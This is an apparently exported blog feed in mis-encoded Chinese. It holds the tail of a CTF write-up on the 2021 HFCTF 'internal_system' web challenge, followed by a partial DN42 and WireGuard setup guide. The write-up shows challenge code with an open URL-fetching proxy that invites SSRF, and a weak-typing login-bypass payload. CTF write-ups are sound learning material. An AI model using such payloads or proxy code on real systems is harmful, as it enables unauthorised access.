req<span class="token punctuation">.</span>method<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> url <span class="token operator">=</span> <span class="token function">decodeURI</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>url<span class="token punctuation">)</span>    <span class="token keyword">const</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>body    <span class="token keyword">try</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'get'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>method <span class="token operator">==</span> <span class="token string">'post'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token punctuation">)</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token function">formatResopnse</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>data<span class="token punctuation">)</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>            result<span class="token punctuation">.</span>content <span class="token operator">=</span> <span class="token string">'Unsupported Method'</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'Error'</span>        result<span class="token punctuation">.</span>content <span class="token operator">=</span> error<span class="token punctuation">.</span>message    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">sendFile</span><span class="token punctuation">(</span> __dirname <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> <span class="token string">"route.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">127\.0\.0\.1</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">{</span>title<span class="token operator">:</span> <span class="token string">'Error'</span><span class="token punctuation">,</span> content<span class="token operator">:</span> <span class="token string">'No Flag For You!'</span><span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">{</span>hint<span class="token operator">:</span> hint<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router</code></pre><p>é¦–å…ˆéœ€è¦ç™»å½•ï¼Œè¿™é‡Œç”¨åˆ°äº† JavaScript å¼±ç±»å‹çš„ç‰¹æ€§ã€‚</p><p>å‚è€ƒ <a href="https://www.gem-love.com/websecurity/2037.html">SuSeC CTF 2020 Writeup &amp; åŸºäºNode.JSçš„sha1ç»•è¿‡åˆ†æ</a> </p><p>ä»¥åŠ <a href="https://d6s3.ac.cn/post/nodejs-url-library-character-mapping-problem/">Node.jsä¸­url.parseå‡½æ•°çš„æ½œåœ¨å®‰å…¨é—®é¢˜</a></p><p>JavaScript åœ¨ä½¿ç”¨åŠ å·æ‹¼æ¥çš„æ—¶å€™æœ€ç»ˆä¼šå¾—åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²(string)ï¼Œäºæ˜¯ä¸ä¼šå½±å“ sha256 çš„å¤„ç†ã€‚</p><p><img src="/2021/04/04/CTF_2021HFCTF/image-20210404235528295.png"></p><p>è¿™é‡Œæ˜¯ç”¨ GET query ä¼ å‚ï¼Œå¯ä»¥æ„é€  payload</p><pre class="language-none"><code class="language-none">username[]=admin&amp;password=admin</code></pre><p>å°±èƒ½æˆåŠŸä»¥ç®¡ç†å‘˜èº«ä»½è¿›å…¥ã€‚</p><p>æ¥ä¸‹æ¥æ‰“ ssrfâ€¦â€¦</p><p><del>ï¼ˆé¢˜ç›®ç¯å¢ƒå…³äº†å¤ç°ä¸äº†äº†å•Šå˜¤å˜¤å˜¤</del></p><p><del>ï¼ˆåé¢å†æ­ç¯å¢ƒå¤ç°å§</del> èµµæ€»çš„ buuoj å¼€äº†ç¯å¢ƒğŸ‘‡ </p><p><strong>ç¯å¢ƒï¼š</strong> <a href="https://buuoj.cn/challenges#%5B%E8%99%8E%E7%AC%A6CTF%202021%5DInternal%20System">[è™ç¬¦CTF 2021] Internal System</a></p><p>è¿™é¢˜å¤ªé¡¶äº†ï¼</p><p>ä¸“é—¨å†™äº†ä¸€ç¯‡å¤ç°è¿™é¢˜çš„åšå®¢ï¼Œç§»æ­¥ä¸‹é¢è¿™ç¯‡å§ã€‚</p><p><a href="http://localhost:4000/2021/04/05/CTF_2021HFCTF_internal_system/">CTF | 2021 è™ç¬¦CTF Web internal_system å¤ç°</a></p><br><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>å°±åšå‡ºäº†ä¸¤é¢˜ webï¼Œå–µå–µå¥½èœå•Šæ˜¯ fwï¼Œå–µå‘œå‘œå‘œï¼ˆ</p><p>ä¸è¿‡æœ‰ç‚¹ä½›ç³»ï¼Œå°±ä¸‹åˆçœ‹äº†ä¸€ä¸‹ï¼Œå¿«åˆ°æ™šä¸Šå°±å‡ºå»ç©äº†<em>ï¼ˆå…¶å®æ²¡è®¤çœŸæ‰“ï¼Œè¿™å°±é€ƒèµ°</em></p><p><em>ï¼ˆæºœäº†æºœäº†å–µ</em></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DN42 | å…¥å‘ DN42 å®éªŒç½‘ç»œ</title>
      <link href="2021/03/25/Server_DN42/"/>
      <url>2021/03/25/Server_DN42/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å…¶å®æƒ³ç© DN42 ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæ­£å¥½æœ€è¿‘ç¾¤å‹ä¹Ÿåœ¨èŠ DN42ï¼ŒåŠ¨ä¸åŠ¨å°±ã€Œ<strong>æ¥ Peerï¼</strong>ã€ã€‚</p><p>é‚£å’±å°±æ¥æ•´ä¸€ä¸ªå¥½äº†ï¼</p><p>è¯·æ³¨æ„ï¼Œæœ¬æ–‡<strong>ä¸æ˜¯</strong>ä¸€ç¯‡å®Œæ•´çš„ä»‹ç»æ€§æ–‡ç« ï¼Œåªæ˜¯è®°å½•ä¸€ä¸‹é…ç½®è¿‡ç¨‹ä¸­é‡åˆ°çš„å‘å•Šä»€ä¹ˆçš„ã€‚</p><h2 id="0x01-What-is-DN42"><a href="#0x01-What-is-DN42" class="headerlink" title="0x01 What is DN42?"></a>0x01 What is DN42?</h2><p><img src="/2021/03/25/Server_DN42/dn42.png"></p><blockquote><p>dn42 is a big dynamic <a href="http://en.wikipedia.org/wiki/Virtual_private_network">VPN</a>, which employs Internet technologies (<a href="http://en.wikipedia.org/wiki/Bgp">BGP</a>, whois database, <a href="http://en.wikipedia.org/wiki/Domain_Name_System">DNS</a>, etc).  Participants connect to each other using network tunnels (<a href="https://dn42.eu/howto/GRE-on-FreeBSD">GRE</a>, <a href="https://dn42.eu/howto/openvpn">OpenVPN</a>, <a href="https://dn42.eu/howto/tinc">Tinc</a>, <a href="https://dn42.eu/howto/IPsec-with-PublicKeys">IPsec</a>) and exchange routes thanks to the Border Gateway Protocol.  Network addresses are assigned in the <code>172.20.0.0/14</code> range and private AS numbers are used (see <a href="https://dn42.eu/services/Whois">registry</a>) as well as IPv6 addresses from the ULA-Range (<code>fd00::/8</code>) - see <a href="https://dn42.eu/FAQ#frequently-asked-questions_what-about-ipv6-in-dn42">FAQ</a>.</p><p>A number of services are provided on the network: see <a href="https://dn42.eu/internal/Internal-Services">internal</a> (only available from within dn42).  Also, dn42 is interconnected with other networks, such as <a href="http://wiki.hamburg.ccc.de/ChaosVPN">ChaosVPN</a> or some <a href="http://en.wikipedia.org/wiki/Freifunk">Freifunk</a> networks.</p><p><em>Via <a href="https://dn42.dev/Home">Official Wiki</a></em></p></blockquote><blockquote><p>DN42 å…¨ç§° Decentralized Network 42ï¼ˆ42 å·å»ä¸­å¿ƒç½‘ç»œï¼‰ï¼Œæ˜¯ä¸€ä¸ªå¤§å‹ã€å»ä¸­å¿ƒåŒ–çš„ VPN ç½‘ç»œã€‚ä½†æ˜¯ä¸å…¶å®ƒä¼ ç»Ÿ VPN ä¸åŒçš„æ˜¯ï¼ŒDN42 æœ¬èº«ä¸æä¾› VPN å‡ºå£æœåŠ¡ï¼Œå³ä¸æä¾›è§„é¿ç½‘ç»œå®¡æŸ¥ã€æµåª’ä½“è§£é”ç­‰ç±»ä¼¼æœåŠ¡ã€‚ç›¸åï¼ŒDN42 çš„ç›®çš„æ˜¯<strong>æ¨¡æ‹Ÿä¸€ä¸ªäº’è”ç½‘</strong>ã€‚å®ƒä½¿ç”¨äº†å¤§é‡åœ¨ç›®å‰äº’è”ç½‘éª¨å¹²ä¸Šåº”ç”¨çš„æŠ€æœ¯ï¼ˆä¾‹å¦‚ BGP å’Œé€’å½’ DNSï¼‰ï¼Œå¯ä»¥å¾ˆå¥½åœ°æ¨¡æ‹Ÿä¸€ä¸ªçœŸå®çš„ç½‘ç»œç¯å¢ƒã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼ŒDN42ï¼š</p><ul><li>ä¸é€‚åˆå•çº¯æƒ³è¦ä¿æŠ¤éšç§ã€è§„é¿ç½‘ç»œå®¡æŸ¥çš„ç”¨æˆ·</li><li>ä¸é€‚åˆåœ¨ç½‘å†…æ¶ˆè€—å¤§é‡æµé‡ï¼Œä¾‹å¦‚ç”¨äºè§£é”æµåª’ä½“æœåŠ¡çš„ç”¨æˆ·</li><li>é€‚åˆæƒ³è¦ç ”ç©¶ç½‘ç»œæŠ€æœ¯ï¼Œç»ƒä¹ æœåŠ¡å™¨ã€è·¯ç”±å™¨ç­‰ç½‘ç»œè®¾å¤‡é…ç½®ï¼Œç”šè‡³åç»­åœ¨çœŸå®äº’è”ç½‘å»ºç«‹ AS çš„ç”¨æˆ·</li><li>é€‚åˆæ‹¥æœ‰çœŸå® ASï¼Œä½†æ‹…å¿ƒè‡ªå·±<a href="https://blog.cloudflare.com/how-verizon-and-a-bgp-optimizer-knocked-large-parts-of-the-internet-offline-today/">é…ç½®é”™è¯¯å¹¿æ’­å‡ºé”™è¯¯è·¯ç”±ã€å¹²æ‰åŠä¸ªäº’è”ç½‘</a>ï¼Œå¸Œæœ›æœ‰ä¸ªåœ°æ–¹æµ‹è¯•çš„ç”¨æˆ·ã€‚</li></ul><p><em>Via <a href="https://lantian.pub/article/modify-website/dn42-experimental-network-2020.lantian/">Lan Tianâ€™s Blog</a></em></p></blockquote><p>å…¶å®å°±æ˜¯è¯´ï¼ŒDN42 æ˜¯ä¸€ä¸ªå¤§å‹ VPN ç½‘ç»œï¼Œæ¨¡æ‹Ÿäº†ç°å®ç”Ÿæ´»ä¸­çš„çœŸå®äº’è”ç½‘ã€‚</p><p>ç›®å‰ DN42 å·²ç»ä¸ <a href="https://neocloud.tw/">NeoNetwork</a>ã€<a href="https://wiki.hamburg.ccc.de/ChaosVPN">ChaosVPN</a> ç­‰ç½‘ç»œå®ç°äº†äº’è”ï¼ŒåŠ å…¥å°±èƒ½ä½“éªŒåˆ°å…¶ä»–ç½‘ç»œå†…çš„èµ„æºã€‚</p><p><strong>é‚£ä¸ºä»€ä¹ˆè¦åŠ å…¥ DN42 å‘¢ï¼Ÿ</strong></p><p><strong>å½“ç„¶æ˜¯å¥½ç©å•¦ w</strong></p><p>ä½ æƒ³æƒ³ï¼Œåªéœ€è¦åŠ¨åŠ¨æ‰‹åŠ¨åŠ¨è„‘ï¼Œå°±èƒ½å…è´¹æ‹¥æœ‰å±äºè‡ªå·±çš„ ASN (Autonomous system numberï¼Œè‡ªæ²»ç³»ç»Ÿç¼–å·)ï¼Œèƒ½å®£å‘Šä¸€æ®µ IPv4 å’Œ IPv6ï¼Œä½“éªŒå„ç§è·¯ç”±åè®®ï¼Œè¿˜èƒ½å’Œåˆ«äººå°½æƒ…åœ° <del>py</del> Peerï¼ˆå¯¹æ¥ï¼‰ã€‚</p><p>è¿™å¯æ¯”æ™®é€šçš„è®¡ç®—æœºç½‘ç»œå®éªŒå¥½ç©å¤šäº†ï¼</p><p>å½“ç„¶ï¼Œä¸ºäº†æŠ˜è…¾ DN42ï¼Œä½ è‡³å°‘éœ€è¦ä¸€å°èƒ½ä¸é—´æ–­è”ç½‘çš„è®¾å¤‡ä»¥åŠå¯¹å®ƒçš„ root æƒé™ï¼Œå½“ç„¶è¿˜éœ€è¦èŠ±ä¸å°‘æ—¶é—´â€¦â€¦<em>ï¼ˆå–µå–µå¥½èœå•Šï¼Œåˆ«éª‚äº†åˆ«éª‚äº†</em></p><h2 id="0x02-å¤§æ¦‚çš„æ­¥éª¤"><a href="#0x02-å¤§æ¦‚çš„æ­¥éª¤" class="headerlink" title="0x02 å¤§æ¦‚çš„æ­¥éª¤"></a>0x02 å¤§æ¦‚çš„æ­¥éª¤</h2><p><strong>TL;DR</strong></p><ol><li>åœ¨ Git ä»“åº“ç”³è¯·è´¦å·ï¼Œç”³è¯·å¥½ä½ éœ€è¦çš„ ASNï¼ŒIP æ®µï¼ˆï¼ŒåŸŸåä»¥åŠåå‘è§£ææœåŠ¡å™¨ï¼‰ï¼Œç„¶åç»™ä»“åº“æPR</li><li>å¯»æ‰¾ä¸€ä¸ªå¯èƒ½çš„ Peer èŠ‚ç‚¹ï¼ŒæŒ‰ç…§ä»–ç•™ä¸‹çš„è”ç³»æ–¹å¼ç»™ä»–å‘é‚®ä»¶/IRC/Telegram/etc.</li><li>å¯»æ‰¾ä¸€ä¸ªå»¶è¿Ÿè¾ƒä½çš„èŠ‚ç‚¹ï¼Œå¹¶å’Œä»–çº¦å®šå¥½ä½¿ç”¨çš„ VPN è½¯ä»¶å’Œè·¯ç”±åè®®</li><li>å»ºç«‹ VPN é€šä¿¡éš§é“ï¼Œç¡®ä¿èƒ½äº’ç›¸è¿é€š</li><li>å»ºç«‹è·¯ç”±ï¼ˆä¸€èˆ¬æ˜¯ BGPï¼‰</li></ol><h2 id="0x03-æ³¨å†Œè¿‡ç¨‹"><a href="#0x03-æ³¨å†Œè¿‡ç¨‹" class="headerlink" title="0x03 æ³¨å†Œè¿‡ç¨‹"></a>0x03 æ³¨å†Œè¿‡ç¨‹</h2><p>è¿™éƒ¨åˆ†ä¸»è¦å‚è€ƒ Lan Tian å¸ˆç¥–çš„ <a href="https://lantian.pub/article/modify-website/dn42-experimental-network-2020.lantian/#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%A8%8B">DN42 å®éªŒç½‘ç»œä»‹ç»åŠæ³¨å†Œæ•™ç¨‹ï¼ˆ2020-10-01 æ›´æ–°ï¼‰</a> ä¸€æ–‡è¿›è¡Œã€‚</p><p>ç›®å‰ DN42 é‡‡ç”¨ git ä»“åº“è¿›è¡Œç®¡ç†ï¼Œå¯ä»¥å‚è€ƒ <a href="https://dn42.dev/howto/Getting-started">DN42 å®˜æ–¹ Wiki howto/Getting Started</a> æ¥è¿›è¡Œé…ç½®ã€‚</p><p>ä¹Ÿå¯ä»¥å‚è€ƒ <a href="https://git.dn42.dev/dn42/registry/pulls/632">å–µå–µçš„ PR</a>ï¼Œå–µ~ ï¼ˆéœ€è¦ç™»å½• gitï¼‰</p><hr><p>ä¸ºäº†æ‰¾ç©ºå‡ºæ¥è€Œä¸”å¥½çœ‹çš„ ASNï¼Œå–µå–µè¿˜ä¸“é—¨å†™äº†ä¸ªè„šæœ¬â€¦â€¦</p><p>å…·ä½“å°±ä¸è¯´äº†ï¼Œä½†åæ§½å‡ å¥ã€‚</p><p>è¿™é‡Œæœ‰å‡ ä¸ªå‘å°±æ˜¯ï¼Œéœ€è¦ç”¨ Linux ç³»ç»Ÿæ¥è¿›è¡Œé…ç½®ï¼Œ<strong>ä¸€å®šä¸è¦ç”¨ Windows ç³»ç»Ÿ</strong>ï¼Œå› ä¸º win çš„æ–‡ä»¶ç³»ç»Ÿä¸æ”¯æŒå¸¦æœ‰ <code>:</code> çš„æ–‡ä»¶åï¼Œäºæ˜¯ git ä»“åº“éƒ½æ‹‰ä¸ä¸‹æ¥ã€‚</p><p>å¦‚æœæƒ³è¦ç”¨ win çš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ WSL2ã€‚</p><p>å¦å¤–å°±æ˜¯ï¼Œæ‰¾ IP æ®µå¾ˆå®¹æ˜“ç¢°åˆ°å†²çªï¼Œè€Œä¸”è‡ªå·±ä¸å®¹æ˜“å‘ç°â€¦â€¦ã€</p><p>æ¯”å¦‚ä¹‹å‰æ‰¾äº†ä¸€æ®µå‘ç°è¢«äººå äº†å¥½å¤§ä¸€å—ï¼Œåˆæˆ–è€…æ•´ä¸ª /18 ä¿ç•™ç»™ /24 - /21 äº†ï¼Œäººå‚»äº†ã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210325221707325.png"></p><p>å†æ¯”å¦‚ä¹‹å‰ç”³è¯·çš„ä¸€ä¸ªæ®µå‘ç°è¢« DN42 å®˜æ–¹ä¿ç•™äº†ã€‚</p><pre class="language-none"><code class="language-none">INFO: 172.22.222.0/26 (inetnum): Inetnum has different mntners than parent and policy of parent is reserved: [MIAOTONY-MNT] vs [DN42-MNT].</code></pre><p><img src="/2021/03/25/Server_DN42/image-20210325220553241.png"></p><p>æ‰¾äº†åŠå¤©æ‰å‘ç°æ˜¯æœ‰ä¸ª 172.22.192.0/18ï¼Œç›´æ¥å¥½å®¶ä¼™ã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210325220717750.png"></p><p>å½“ç„¶ï¼Œå¦‚æœæœ‰å¤šä¸ª commit è®°å½•ï¼Œè®°å¾—å…ˆ squash ä¸€ä¸‹å† pushï¼Œå¯ä»¥ç›´æ¥ç”¨ç›®å½•ä¸‹è‡ªå¸¦çš„è„šæœ¬æ¥ pushã€‚</p><p>ä¸è¿‡å…¶å®ä¹Ÿæ²¡å•¥å…³ç³»ï¼ŒPR ä¸Šå»ä¹‹åæœ‰ CI è‡ªåŠ¨è¿›è¡Œæ£€æµ‹ï¼ŒæŒ‰ç…§è¦æ±‚æ›´æ”¹å°±å®Œäº‹äº†ã€‚</p><h2 id="0x04-é¦–å…ˆè¦è¿›è¡Œçš„ç³»ç»Ÿé…ç½®"><a href="#0x04-é¦–å…ˆè¦è¿›è¡Œçš„ç³»ç»Ÿé…ç½®" class="headerlink" title="0x04 é¦–å…ˆè¦è¿›è¡Œçš„ç³»ç»Ÿé…ç½®"></a>0x04 é¦–å…ˆè¦è¿›è¡Œçš„ç³»ç»Ÿé…ç½®</h2><p><strong>åœ¨æ¯ä¸€å°è¦åŠ å…¥ DN42 çš„èŠ‚ç‚¹éƒ½éœ€è¦è¿›è¡Œä»¥ä¸‹é…ç½®ï¼</strong></p><ol><li>æ‰“å¼€ Linux å†…æ ¸çš„æ•°æ®åŒ…è½¬å‘åŠŸèƒ½ï¼Œå³ <code>ip_forwarding</code>ã€‚</li><li>å…³é—­ Linux å†…æ ¸ <code>rp_filter</code> çš„ä¸¥æ ¼æ¨¡å¼ã€‚</li><li>å…³æ‰ ufw ç­‰å¸®åŠ©é…ç½® iptables é˜²ç«å¢™çš„å·¥å…·ã€‚ï¼ˆå¦‚æœ‰éœ€è¦ï¼Œæ‰‹åŠ¨é…ç½® iptables</li></ol><p>å‰ä¸¤æ¡è®¾ç½®æ­¥éª¤å¦‚ä¸‹ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/sysctl.conf</code></pre><p>æ–°å¢ä»¥ä¸‹å‡ æ¡é…ç½®</p><pre class="language-conf" data-language="conf"><code class="language-conf">net.ipv4.ip_forward=1net.ipv6.conf.default.forwarding=1net.ipv6.conf.all.forwarding=1net.ipv4.conf.default.rp_filter=2net.ipv4.conf.all.rp_filter=2</code></pre><p>ç„¶ååº”ç”¨é…ç½®</p><pre class="language-bash" data-language="bash"><code class="language-bash">sysctl -p</code></pre><h2 id="0x05-å»ºç«‹é€šä¿¡éš§é“"><a href="#0x05-å»ºç«‹é€šä¿¡éš§é“" class="headerlink" title="0x05 å»ºç«‹é€šä¿¡éš§é“"></a>0x05 å»ºç«‹é€šä¿¡éš§é“</h2><p>DN42 æ˜¯åŸºäº VPN æ¥å»ºç«‹é€šä¿¡è¿æ¥çš„ï¼Œä¸ºäº†æ–¹ä¾¿ï¼Œå¤§å¤šæ•°ç”¨æˆ·éƒ½ä½¿ç”¨ WireGuard æ¥è¿›è¡Œã€‚</p><p>WireGuard æ˜¯ L3 å±‚éš§é“ï¼Œç›®å‰å·²ç»é›†æˆåˆ°äº† Linux å†…æ ¸ä¸­ï¼Œå®ƒé…ç½®ç®€å•ï¼Œå ç”¨èµ„æºå°‘ï¼Œå®‰å…¨æ€§è¾ƒé«˜ã€‚</p><p>å¦‚æœä¸æ˜¯ OpenVZ æˆ–è€… LXC è™šæ‹ŸåŒ–çš„è¯ï¼Œå…¶ä»–åº”è¯¥éƒ½èƒ½ç”¨å§ï¼Œä¸æ”¯æŒçš„è¯å¯èƒ½éœ€è¦å‡çº§ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ã€‚</p><p>è¿™é‡Œå¯ä»¥å‚è€ƒ <a href="https://dn42.dev/howto/wireguard">å®˜æ–¹ Wiki çš„ howto/wireguard</a> æ¥è¿›è¡Œã€‚</p><blockquote><p>Wireguard is a Layer3 VPN. In theory it allows multiple peers to be served with one interface/port, but it does internal routing based on the peerâ€™s public key. This means you will need one interface per peering on dn42 to allow your BGP daemon instead to do routing. This approach is  comparable to <a href="https://dn42.dev/howto/openvpn">OpenVPN p2p tunnels</a>.</p></blockquote><p>æ„æ€æ˜¯ wg å†…éƒ¨çš„è·¯ç”±æ˜¯åŸºäºå…¬é’¥æ¥è¿›è¡Œçš„ï¼Œäºæ˜¯å’Œä¸åŒçš„ç½‘ç»œè¿›è¡Œ peerï¼Œå¯¹äºæ¯ä¸ª peer éƒ½éœ€è¦å»ºç«‹ä¸€ä¸ªæ–°çš„æ¥å£ï¼Œä¹Ÿå°±ç›¸å½“äºå¤šä¸€ä¸ªè™šæ‹Ÿç½‘å¡ã€‚ä¸è¿‡è¿™ä¸ªæ¥å£çš„ IP å¯ä»¥éƒ½ä¸€æ ·ï¼Œä¸å—å½±å“ã€‚</p><p>é¦–å…ˆ <strong>ç”Ÿæˆä¸€å¯¹å…¬é’¥å’Œç§é’¥</strong></p><pre class="language-bash" data-language="bash"><code class="language-bash">wg genkey <span class="token operator">|</span> <span class="token function">tee</span> privatekey <span class="token operator">|</span> wg pubkey <span class="token operator">&gt;</span> publickey</code></pre><p>ä¸åŒäº Lan Tian å¸ˆç¥–çš„ <a href="https://lantian.pub/article/modify-website/dn42-experimental-network-2020.lantian/#%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA%EF%BC%9AWireGuard">sh é…ç½®è„šæœ¬</a>ï¼Œæ­¤å¤„å–µå–µ <strong>ç›´æ¥ä½¿ç”¨ <code>wg-quick</code> æ¥é…ç½®</strong>ã€‚</p><p>è¿™æ˜¯<strong>æˆ‘çš„é…ç½®æ¨¡æ¿</strong>ã€‚ä¸€èˆ¬æ˜¯æ”¾åœ¨ <code>/etc/wireguard/xxx.conf</code>.</p><pre class="language-conf" data-language="conf"><code class="language-conf">[Interface]PrivateKey = &lt;è‡ªå·±çš„ç§é’¥&gt;ListenPort = &lt;è‡ªå·±ç›‘å¬çš„ç«¯å£ï¼Œä¸€èˆ¬æ˜¯å¯¹æ–¹ASNåäº”ä½&gt;PostUp = ip addr add &lt;ä½ çš„DN42 IPv4&gt;/32 peer &lt;å¯¹æ–¹çš„DN42 IPv4&gt;/32 dev %i# å¦‚æœç”¨ IPv6 ULA# PostUp = ip addr add &lt;ä½ çš„DN42 IPv6&gt;/128 peer &lt;å¯¹æ–¹çš„DN42 IPv6&gt;/128 dev %i# å¦‚æœç”¨ link-localï¼ˆæ¨èï¼‰PostUp = ip addr add &lt;link-local&gt;/64 dev %iTable = off[Peer]PublicKey = &lt;å¯¹æ–¹çš„å…¬é’¥&gt;Endpoint = &lt;å¯¹æ–¹çš„å…¬ç½‘åœ°å€&gt;:&lt;å¯¹æ–¹çš„ç«¯å£ï¼Œä¸€èˆ¬æ˜¯è‡ªå·±ASNåäº”ä½&gt;AllowedIPs = 0.0.0.0/0, ::/0</code></pre><p>å¦‚æœ <code>[Interface]</code> é‡Œå†™äº† <code>Address</code> çš„è¯éœ€è¦åœ¨ <code>PostUp</code> é‡Œå…ˆåˆ æ‰ addr å†åŠ ä¸Š <code>peer</code>ï¼Œæ‰€ä»¥å¹²è„†å°±ä¸é… <code>Address</code> äº†ã€‚</p><p>æ³¨æ„è¿™é‡Œ <code>Table = off</code> è¦åŠ ä¸Šï¼Œä¸ç„¶æ‰€æœ‰çš„æµé‡ï¼ŒåŒ…æ‹¬å…¬ç½‘ä¸Šçš„æµé‡å°±éƒ½è½¬å‘ç»™ä½ çš„ peer äº†ï¼Œè¿™æ ·å¯èƒ½ä½ å°±è¿è‡ªå·±çš„æœºå™¨éƒ½è¿ä¸ä¸Šäº†ã€‚</p><p><img src="/2021/03/25/Server_DN42/image-20210327015332317.png"></p><p><em>ç„¶åå–µå–µé…å®Œ wgï¼Œä¸€å¯åŠ¨ï¼ŒSSH è¿æ¥æ–­äº†ï¼Œå–µå–µæ„£ä½äº†ï¼ˆè¿˜å¥½æœåŠ¡å•†èƒ½èµ· VNCï¼Œç„¶åä¸Šå»æŠŠ wg è¿æ¥æ–­äº†æ‰é‡æ–°è¿ä¸Š SSHâ€¦</em></p><p>è¿™é‡Œä¸€èˆ¬æ¨èç”¨ <a href="https://en.wikipedia.org/wiki/Link-local_address">link-local åœ°å€</a> è¿›è¡Œé…ç½®ï¼Œé™¤éåŒæ–¹çº¦å®šå¥½æ˜¯ç”¨ ULAã€‚</p><p>è¿™æ˜¯<strong>é“¾è·¯æœ¬åœ°åœ°å€</strong>ï¼Œ IPv6 å®šä¹‰åœ¨ <strong>fe80::/10</strong> åœ°å€å—ã€‚ä¸€èˆ¬å°±æ˜¯ <code>fe80::&lt;ä½ çš„ASNåå››ä½&gt;</code>ã€‚</p><p>ç„¶åä¸ºäº†æ–¹ä¾¿ï¼Œå‚è€ƒ <a href="https://cas7.moe/">@moecast</a> å¤§ä½¬çš„é…ç½®è„šæœ¬ï¼Œä¸€æ­¥é…ç½® serviceã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /sbin/wgen<span class="token comment">#!/bin/bash</span><span class="token assign-left variable">filename</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token function">basename</span> -- $1 .conf<span class="token variable">)</span></span>"</span>systemctl <span class="token builtin class-name">enable</span> wg-quick@<span class="token variable">$filename</span>.service<span class="token function">service</span> wg-quick@<span class="token variable">$filename</span> start</code></pre><p>è¿™ä¸ªè„šæœ¬å°†å¯åŠ¨éš§é“ï¼Œå¹¶æŠŠé…ç½®æ³¨å†Œåˆ° service ä¸­ï¼Œå®ç°å¼€æœºè‡ªå¯ã€‚</p><p>æŠŠè¿™ä¸ªè„šæœ¬æ”¾åˆ° <code>/sbin/wgen</code>ï¼Œç„¶å <code>chmod +x /sbin/wgen</code> èµ‹äºˆæ‰§è¡Œæƒé™ã€‚</p><p>éœ€è¦ç”¨çš„æ—¶å€™ç›´æ¥ <code>wgen 